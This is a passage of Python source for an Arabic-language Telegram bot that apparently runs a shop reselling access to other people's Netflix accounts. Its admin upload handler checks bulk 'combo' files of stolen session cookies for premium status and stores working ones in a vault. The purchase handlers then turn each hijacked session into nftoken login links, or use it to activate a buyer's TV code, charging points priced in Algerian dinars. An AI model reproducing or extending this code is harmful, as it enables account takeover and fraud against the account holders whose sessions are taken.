        "⏳ في انتظار موافقة الأدمن.\n"
        f"💰 المطلوب: {stars} نجمة\n"
        f"📞 تواصل: {TECH_USERNAME}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📞 تواصل", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
        ]))

    # أشعر القناة
    await notify_channel(context,
        f"💰 <b>طلب شحن جديد</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 المستخدم: <code>{uid}</code>\n"
        f"⭐ المطلوب: {stars} نجمة\n"
        f"➕ النقاط: {cfg.get('topup_points', TOPUP_POINTS)}\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )


# ============================================================
# BUY
# ============================================================
async def buy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    user = get_user(uid)
    price = get_account_price()
    points = user.get("points", 0)

    if points < price:
        need = price - points
        await q.edit_message_text(
            f"❌ <b>نقاطك غير كافية</b>\n\n"
            f"💰 رصيدك: <b>{points}</b>\n"
            f"🏷️ السعر: <b>{price}</b>\n"
            f"📉 تحتاج: <b>{need}</b> نقطة إضافية",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💰 شحن رصيد", callback_data="topup")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
            ]))
        return

    vault = count_vault_cookies()
    if vault == 0:
        await q.edit_message_text(
            "❌ <b>الخزنة فارغة</b>\n\n"
            "لا توجد حسابات متاحة الآن. حاول لاحقاً.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
            ]))
        return

    txt = (
        f"🛒 <b>شراء حساب</b>\n\n"
        f"💰 سعر الحساب: <b>{price} نقطة</b>\n"
        f"🎯 رصيدك: <b>{points} نقطة</b>\n"
        f"📦 المتاح: <b>{vault} حساب</b>\n\n"
        f"اختر نوع التفعيل:"
    )
    await q.edit_message_text(txt, parse_mode="HTML",
                              reply_markup=buy_type_markup())


async def buy_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    user = get_user(uid)
    price = get_account_price()

    if user.get("points", 0) < price:
        await q.answer("❌ نقاطك غير كافية", show_alert=True)
        return

    vault = count_vault_cookies()
    if vault == 0:
        await q.answer("❌ الخزنة فارغة", show_alert=True)
        return

    status = await q.edit_message_text("🔍 <b>جاري تحضير الحساب...</b>",
                                        parse_mode="HTML")
    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(
        animate_message(context, q.message.chat_id, status.message_id,
                        stop_anim, "Preparing account...")
    )

    # احصل على حساب
    result = await asyncio.to_thread(_pull_and_link_cookie)

    stop_anim.set()
    await asyncio.sleep(0.3)
    try:
        anim_task.cancel()
    except Exception:
        pass

    if not result["ok"]:
        await status.edit_text(
            f"❌ <b>فشل تحضير الحساب</b>\n\n"
            f"⚠️ {result.get('error','unknown')}\n\n"
            f"لم يتم خصم أي نقاط.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
            ]))
        return

    # خصم النقاط
    new_balance = remove_points(uid, price)

    # سجل الشراء
    user = get_user(uid)
    purchase = {
        "type": "phone",
        "name": result["name"],
        "email": result["email"],
        "country": result["country"],
        "plan": result["plan"],
        "token": result["token"],
        "expires": result["expires"],
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    user.setdefault("purchases", []).append(purchase)
    set_user(uid, user)

    txt = (
        f"✅ <b>تم الشراء بنجاح</b>\n\n"
        f"👤 <b>الاسم:</b> {result['name']}\n"
        f"📧 <b>الإيميل:</b> <code>{result['email']}</code>\n"
        f"🌍 <b>الدولة:</b> {result['country']}\n"
        f"📦 <b>الخطة:</b> {result['plan']}\n"
        f"⏰ <b>Expires:</b> {result['expires']}\n\n"
        f"💰 <b>رصيدك الجديد:</b> {new_balance} نقطة\n\n"
        f"📱 <b>هاتف:</b>\n"
        f"<code>https://www.netflix.com/unsupported?nftoken={result['token']}</code>\n\n"
        f"💻 <b>كمبيوتر:</b>\n"
        f"<code>https://www.netflix.com/browse?nftoken={result['token']}</code>"
    )
    await status.edit_text(txt, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🛒 شراء آخر", callback_data="buy")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")],
        ]))

    # إشعار القناة
    market = get_market_price()
    await notify_channel(context,
        f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 المشتري: <code>{uid}</code>\n"
        f"📦 الخدمة: حساب المشاهدة (📱 هاتف)\n"
        f"🔢 العدد: 1\n"
        f"💰 السعر: {market} د.جزائري\n"
        f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎬 {STORE_NAME} - حسابات جاهزة للتسليم الفوري"
    )


async def buy_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    user = get_user(uid)
    price = get_account_price()

    if user.get("points", 0) < price:
        await q.answer("❌ نقاطك غير كافية", show_alert=True)
        return

    vault = count_vault_cookies()
    if vault == 0:
        await q.answer("❌ الخزنة فارغة", show_alert=True)
        return

    user_state[uid] = {"mode": "awaiting_tv_code"}
    await q.edit_message_text(
        "📺 <b>تفعيل شاشة TV</b>\n\n"
        "أرسل كود الشاشة (8 أرقام) المظاهر على تلفازك:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
        ]))


async def handle_tv_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = user_state.get(uid, {})
    if state.get("mode") != "awaiting_tv_code":
        return

    text = update.message.text.strip()
    code = re.sub(r'\D', '', text)
    if len(code) != 8:
        await update.message.reply_text(
            "❌ الكود لازم 8 أرقام. جرب مرة ثانية:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 إلغاء", callback_data="back_home")]
            ]))
        return

    user_state[uid]["mode"] = "idle"

    user = get_user(uid)
    price = get_account_price()
    if user.get("points", 0) < price:
        await update.message.reply_text("❌ نقاطك غير كافية")
        return

    if count_vault_cookies() == 0:
        await update.message.reply_text("❌ الخزنة فارغة")
        return

    status = await update.message.reply_text(
        f"🔍 <b>جاري التفعيل...</b>\n📺 الكود: <code>{code}</code>",
        parse_mode="HTML")
    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(
        animate_message(context, update.effective_chat.id, status.message_id,
                        stop_anim, "Activating TV..."))

    result = await asyncio.to_thread(process_tv_login, code)

    stop_anim.set()
    await asyncio.sleep(0.3)
    try:
        anim_task.cancel()
    except Exception:
        pass

    with tv_stats_lock:
        tv_stats["total_logins"] += 1

    if result.get("success"):
        with tv_stats_lock:
            tv_stats["successful"] += 1

        new_balance = remove_points(uid, price)
        user = get_user(uid)
        purchase = {
            "type": "tv",
            "code": code,
            "country": result.get("country", "N/A"),
            "plan": result.get("plan", "N/A"),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        user.setdefault("purchases", []).append(purchase)
        set_user(uid, user)

        await status.edit_text(
            f"✅ <b>تم التفعيل!</b>\n\n"
            f"📺 الكود: <code>{code}</code>\n"
            f"🌍 الدولة: {result.get('country','N/A')}\n"
            f"📦 الباقة: {result.get('plan','N/A')}\n\n"
            f"💰 رصيدك: <b>{new_balance}</b> نقطة",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
            ]))

        # إشعار القناة
        market = get_market_price()
        await notify_channel(context,
            f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 المشتري: <code>{uid}</code>\n"
            f"📦 الخدمة: حساب المشاهدة (📺 TV)\n"
            f"🔢 العدد: 1\n"
            f"💰 السعر: {market} د.جزائري\n"
            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🎬 {STORE_NAME}"
        )
    else:
        with tv_stats_lock:
            if result.get("error") == "no_cookies_left":
                tv_stats["failed"] += 1
            else:
                tv_stats["codes_rejected"] += 1

        if result.get("error") == "no_cookies_left":
            msg = ("😔 <b>الخزنة فارغة</b>\n\n"
                   "لم يتم خصم أي نقاط. حاول لاحقاً.")
        else:
            msg = (f"❌ <b>فشل التفعيل</b>\n\n"
                   f"⚠️ {result.get('error','unknown')}\n\n"
                   f"لم يتم خصم أي نقاط.")

        await status.edit_text(msg, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
            ]))


def _pull_and_link_cookie():
    """يسحب حساب من الخزنة ويولّد nftoken"""
    attempts = 0
    while attempts < 10:
        attempts += 1
        filename, content = get_random_cookie_file()
        if not filename:
            return {"ok": False, "error": "الخزنة فارغة"}
        ck = extract_cookie_dict_tv(content)
        if not ck or not ck.get('NetflixId'):
            continue
        res = check_netflix_cookie(ck)
        if not res.get("ok") or not res.get("premium"):
            continue
        tok, err = generate_nftoken(ck)
        if not tok:
            continue
        return {
            "ok": True,
            "name": res.get("name", "Unknown"),
            "email": res.get("email", "Unknown"),
            "country": res.get("country", "Unknown"),
            "plan": res.get("plan", "Unknown"),
            "token": tok["token"],
            "expires": tok["expires"],
        }
    return {"ok": False, "error": "لم يتم العثور على حساب فعّال"}


# ============================================================
# MY PURCHASES
# ============================================================
async def my_purchases(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()

    user = get_user(uid)
    purchases = user.get("purchases", [])

    if not purchases:
        await q.edit_message_text(
            "📦 <b>مشترياتي</b>\n\nلا توجد مشتريات بعد.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
            ]))
        return

    txt = f"📦 <b>مشترياتي ({len(purchases)})</b>\n\n"
    for i, p in enumerate(purchases[-10:], 1):
        if p["type"] == "phone":
            txt += (
                f"{i}. 📱 هاتف\n"
                f"   👤 {p.get('name','—')}\n"
                f"   📅 {p.get('date','—')}\n\n"
            )
        else:
            txt += (
                f"{i}. 📺 TV\n"
                f"   🔢 كود: <code>{p.get('code','—')}</code>\n"
                f"   📅 {p.get('date','—')}\n\n"
            )

    txt += f"\n💰 رصيدك: <b>{user.get('points',0)}</b> نقطة"

    await q.edit_message_text(txt, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]
        ]))


# ============================================================
# ADMIN
# ============================================================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    await q.edit_message_text(
        f"👑 <b>لوحة الأدمن</b>\n\n"
        f"💰 السعر: <b>{get_account_price()}</b> نقطة\n"
        f"💵 سعر السوق: <b>{get_market_price()}</b> د.ج\n"
        f"📦 الخزنة: <b>{count_vault_cookies()}</b>\n"
        f"💳 طلبات شحن: <b>{len(load_topups())}</b>",
        parse_mode="HTML",
        reply_markup=admin_markup())


async def admin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_check"}
    await q.edit_message_text(
        "🔍 <b>فحص كومبو</b>\n\n"
        "📤 ارفع ملف <code>.txt</code> / <code>.json</code> / <code>.zip</code>\n\n"
        "⚙️ سيتم فحص بريميوم فقط وحفظهم بالخزنة.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    files = get_vault_cookies()
    n = len(files)
    for f in files:
        try: os.remove(os.path.join(COOKIES_DIR, f))
        except Exception: pass
    await q.answer(f"🗑 حُذف {n}", show_alert=True)
    await admin_panel(update, context)


async def admin_set_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_set_price"}
    await q.edit_message_text(
        f"💵 <b>تغيير سعر الحساب</b>\n\n"
        f"السعر الحالي: <b>{get_account_price()}</b> نقطة\n\n"
        f"أرسل السعر الجديد (نقاط):",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_set_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_set_market"}
    await q.edit_message_text(
        f"💰 <b>تغيير سعر السوق</b>\n\n"
        f"السعر الحالي: <b>{get_market_price()}</b> د.ج\n\n"
        f"أرسل السعر الجديد (دينار):",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_add_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_add_points"}
    await q.edit_message_text(
        "➕ <b>إضافة نقاط</b>\n\n"
        "أرسل: <code>user_id نقاط</code>\n"
        "مثال: <code>123456789 15</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_remove_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_remove_points"}
    await q.edit_message_text(
        "➖ <b>خصم نقاط</b>\n\n"
        "أرسل: <code>user_id نقاط</code>\n"
        "مثال: <code>123456789 10</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid != OWNER_ID:
        await q.answer("🚫 للمالك فقط", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_promote"}
    await q.edit_message_text(
        "👥 <b>رفع أدمن</b>\n\n"
        "أرسل ID المستخدم:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid != OWNER_ID:
        await q.answer("🚫 للمالك فقط", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_demote"}
    if not dyn_admins:
        await q.edit_message_text("لا يوجد أدمنز إضافيين.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
            ]))
        return
    await q.edit_message_text(
        "📉 <b>تنزيل أدمن</b>\n\n"
        "أرسل ID المستخدم:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


async def admin_topups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()

    topups = load_topups()
    if not topups:
        await q.edit_message_text(
            "💳 <b>طلبات الشحن</b>\n\nلا توجد طلبات.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
            ]))
        return

    txt = f"💳 <b>طلبات الشحن ({len(topups)})</b>\n\n"
    rows = []
    for u_id, data in list(topups.items())[:10]:
        txt += (f"👤 <code>{u_id}</code>\n"
                f"📅 {data['created_at']}\n\n")
        rows.append([
            InlineKeyboardButton(f"✅ موافقة {u_id}", callback_data=f"apv_{u_id}"),
            InlineKeyboardButton(f"❌ رفض {u_id}", callback_data=f"rej_{u_id}"),
        ])
    rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
    await q.edit_message_text(txt, parse_mode="HTML",
                              reply_markup=InlineKeyboardMarkup(rows))


async def admin_approve_topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return

    target = int(q.data.split("_", 1)[1])
    cfg = load_config()
    points = cfg.get("topup_points", TOPUP_POINTS)

    if approve_topup(target, points):
        await q.answer(f"✅ تمت الموافقة (+{points})", show_alert=True)
        # أشعر المستخدم
        try:
            await context.bot.send_message(
                target,
                f"✅ <b>تمت الموافقة على طلبك</b>\n\n"
                f"➕ +{points} نقطة\n"
                f"💰 رصيدك: <b>{get_user_points(target)}</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass
        # إشعار القناة
        await notify_channel(context,
            f"✅ <b>تمت الموافقة على شحن</b>\n"
            f"👤 <code>{target}</code>\n"
            f"➕ {points} نقطة")
    else:
        await q.answer("⚠️ الطلب غير موجود", show_alert=True)

    await admin_topups(update, context)


async def admin_reject_topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return

    target = int(q.data.split("_", 1)[1])
    if reject_topup(target):
        await q.answer("❌ رفض", show_alert=True)
        try:
            await context.bot.send_message(
                target,
                "❌ <b>تم رفض طلب الشحن</b>\n\n"
                f"📞 تواصل: {TECH_USERNAME}",
                parse_mode="HTML"
            )
        except Exception:
            pass
    else:
        await q.answer("⚠️ غير موجود", show_alert=True)

    await admin_topups(update, context)


async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()

    users = load_users()
    total_users = len(users)
    total_points = sum(u.get("points", 0) for u in users.values())
    total_purchases = sum(len(u.get("purchases", [])) for u in users.values())
    topups_count = len(load_topups())

    with tv_stats_lock:
        txt = (
            f"📊 <b>إحصائيات شاملة</b>\n\n"
            f"👥 <b>المستخدمين:</b> {total_users}\n"
            f"💰 <b>مجموع النقاط:</b> {total_points}\n"
            f"📦 <b>المشتريات:</b> {total_purchases}\n"
            f"💳 <b>طلبات شحن معلقة:</b> {topups_count}\n"
            f"📦 <b>الخزنة:</b> {count_vault_cookies()}\n\n"
            f"🎬 <b>محاولات TV:</b> {tv_stats['total_logins']}\n"
            f"✅ نجحت: {tv_stats['successful']}\n"
            f"❌ فشلت: {tv_stats['failed']}\n"
            f"🚫 أكواد خاطئة: {tv_stats['codes_rejected']}"
        )
    await q.edit_message_text(txt, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
        ]))


# ============================================================
# FILE UPLOAD (admin check)
# ============================================================
async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private": return
    uid = update.effective_user.id
    if not is_admin(uid): return
    if user_state.get(uid, {}).get("mode") != "admin_check": return

    file = await update.message.document.get_file()
    ext = update.message.document.file_name.lower()

    with tempfile.TemporaryDirectory() as td:
        tp = os.path.join(td, update.message.document.file_name)
        await file.download_to_drive(tp)

        cookies = []
        if ext.endswith('.zip'):
            cookies = await extract_cookies_from_zip(tp)
        else:
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            c = parse_cookie_file(content)
            for idx, (bn, cc) in enumerate(c):
                if cc.get('NetflixId'):
                    cookies.append((f"{safe_filename(update.message.document.file_name)}_{idx}", cc))

        seen = set(); dedup = []
        for nm, ck in cookies:
            h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h); dedup.append((nm, ck))

        if not dedup:
            await update.message.reply_text("❌ لا كوكيز في الملف.")
            return

        status = await update.message.reply_text(
            f"🔍 <b>جاري الفحص (بريم فقط)...</b>\n\n"
            f"📥 {safe_filename(update.message.document.file_name)}\n"
            f"🍪 {len(dedup)} كوكي",
            parse_mode="HTML")

        if uid not in user_executors:
            user_executors[uid] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        executor = user_executors[uid]

        premium = free = invalid = 0
        total = len(dedup); checked = 0

        for batch_start in range(0, total, BATCH_SIZE):
            batch = dedup[batch_start:batch_start + BATCH_SIZE]
            loop = asyncio.get_running_loop()
            futures = [
                asyncio.wait_for(
                    loop.run_in_executor(executor, check_netflix_cookie, ck),
                    timeout=35)
                for nm, ck in batch
            ]
            results = await asyncio.gather(*futures, return_exceptions=True)

            for i, result in enumerate(results):
                checked += 1
                nm, ck = batch[i]
                if isinstance(result, Exception):
                    invalid += 1; continue
                if result.get("ok"):
                    if result.get("premium"):
                        if save_cookie_to_vault(nm, ck):
                            premium += 1
                    else:
                        free += 1
                else:
                    invalid += 1

            try:
                filled = min(20, checked * 20 // total) if total > 0 else 20
                bar = '█' * filled + '░' * (20 - filled)
                await status.edit_text(
                    f"🔍 <b>جاري الفحص...</b>\n\n"
                    f"<code>{bar}</code> {checked}/{total}\n\n"
                    f"🌟 بريم: {premium}\n"
                    f"🆓 مجاني: {free}\n"
                    f"❌ فاسد: {invalid}",
                    parse_mode="HTML")
            except Exception:
                pass

        user_state[uid]["mode"] = "idle"

        await status.edit_text(
            f"✅ <b>اكتمل</b>\n\n"
            f"📥 فُحص: {total}\n"
            f"🌟 محفوظ: {premium}\n"
            f"🆓 تجاهل: {free}\n"
            f"❌ فاسد: {invalid}\n"
            f"📦 الخزنة: {count_vault_cookies()}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👑 لوحة الأدمن", callback_data="admin_panel")]
            ]))


# ============================================================
# TEXT HANDLER (admin inputs)
# ============================================================
async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    mode = user_state.get(uid, {}).get("mode", "idle")
    text = update.message.text.strip()

    # TV code input (user)
    if mode == "awaiting_tv_code":
        await handle_tv_code_input(update, context)
        return

    if not is_admin(uid):
        return

    if mode == "admin_set_price":
        try:
            p = int(text)
            if p < 1: raise ValueError
            set_account_price(p)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(f"✅ السعر الآن: {p} نقطة")
            await notify_channel(context,
                f"💵 <b>تحديث السعر</b>\n"
                f"🏷️ السعر الجديد: <b>{p}</b> نقطة")
        except Exception:
            await update.message.reply_text("❌ رقم غير صالح")
        return

    if mode == "admin_set_market":
        try:
            p = int(text)
            if p < 1: raise ValueError
            set_market_price(p)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(f"✅ سعر السوق الآن: {p} د.ج")
        except Exception:
            await update.message.reply_text("❌ رقم غير صالح")
        return

    if mode == "admin_add_points":
        try:
            parts = text.split()
            target = int(parts[0])
            amount = int(parts[1])
            new_balance = add_points(target, amount)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(
                f"✅ تم إضافة {amount} نقطة لـ {target}\n"
                f"💰 الرصيد الجديد: {new_balance}")
            try:
                await context.bot.send_message(
                    target,
                    f"➕ <b>تمت إضافة نقاط</b>\n\n"
                    f"+{amount} نقطة\n"
                    f"💰 رصيدك: {new_balance}",
                    parse_mode="HTML")
            except Exception:
                pass
            await notify_channel(context,
                f"➕ <b>إضافة نقاط</b>\n"
                f"👤 {target}\n"
                f"➕ {amount} نقطة\n"
                f"💰 {new_balance}")
        except Exception:
            await update.message.reply_text(
                "❌ صيغة خاطئة. مثال: <code>123456789 15</code>",
                parse_mode="HTML")
        return

    if mode == "admin_remove_points":
        try:
            parts = text.split()
            target = int(parts[0])
            amount = int(parts[1])
            new_balance = remove_points(target, amount)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(
                f"✅ تم خصم {amount} نقطة من {target}\n"
                f"💰 الرصيد: {new_balance}")
        except Exception:
            await update.message.reply_text(
                "❌ صيغة خاطئة. مثال: <code>123456789 10</code>",
                parse_mode="HTML")
        return

    if mode == "admin_promote":
        try:
            target = int(text)
            if target in dyn_admins or target == OWNER_ID:
                await update.message.reply_text("⚠️ موجود مسبقاً")
                return
            dyn_admins.append(target)
            save_dyn_admins(dyn_admins)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(f"✅ تم رفع الأدمن: {target}")
            try:
                await context.bot.send_message(target,
                    "🎉 <b>مبروك!</b>\nتم ترقيتك إلى أدمن.",
                    parse_mode="HTML")
            except Exception:
                pass
        except Exception:
            await update.message.reply_text("❌ رقم غير صالح")
        return

    if mode == "admin_demote":
        try:
            target = int(text)
            if target not in dyn_admins:
                await update.message.reply_text("⚠️ مو أدمن")
                return
            dyn_admins.remove(target)
            save_dyn_admins(dyn_admins)
            user_state[uid]["mode"] = "idle"
            await update.message.reply_text(f"✅ تم تنزيل الأدمن: {target}")
            try:
                await context.bot.send_message(target,
                    "⚠️ <b>تم تنزيلك من الأدمن</b>",
                    parse_mode="HTML")
            except Exception:
                pass
        except Exception:
            await update.message.reply_text("❌ رقم غير صالح")
        return


# ============================================================
# CALLBACK ROUTER
# ============================================================
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data

    if data == "back_home":
        await back_home(update, context); return
    if data == "buy":
        await buy_menu(update, context); return
    if data == "buy_phone":
        await buy_phone(update, context); return
    if data == "buy_tv":
        await buy_tv(update, context); return
    if data == "topup":
        await topup(update, context); return
    if data == "topup_submit":
        await topup_submit(update, context); return
    if data == "ref_link":
        await ref_link(update, context); return
    if data == "my_purchases":
        await my_purchases(update, context); return
    if data == "my_account":
        await my_account(update, context); return

    if data == "admin_panel":
        await admin_panel(update, context); return
    if data == "admin_check":
        await admin_check(update, context); return
    if data == "admin_clear":
        await admin_clear(update, context); return
    if data == "admin_set_price":
        await admin_set_price(update, context); return
    if data == "admin_set_market":
        await admin_set_market(update, context); return
    if data == "admin_add_points":
        await admin_add_points(update, context); return
    if data == "admin_remove_points":
        await admin_remove_points(update, context); return
    if data == "admin_promote":
        await admin_promote(update, context); return
    if data == "admin_demote":
        await admin_demote(update, context); return
    if data == "admin_topups":
        await admin_topups(update, context); return
    if data == "admin_stats":
        await admin_stats(update, context); return

    if data.startswith("apv_"):
        await admin_approve_topup(update, context); return
    if data.startswith("rej_"):
        await admin_reject_topup(update, context); return

    await q.answer()


# ============================================================
# MAIN
# ============================================================
def main():
    print("=" * 55)
    print(f"  🎬 {STORE_NAME} BOT v2")
    print("=" * 55)
    print(f"  Vault: {count_vault_cookies()}")
    print(f"  Price: {get_account_price()} points")
    print(f"  Market: {get_market_price()} DZD")
    print(f"  Channel: {CHANNEL_ID}")
    print("=" * 55)

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))

    app.add_handler(CallbackQueryHandler(callback_router))
    app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("🚀 Running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
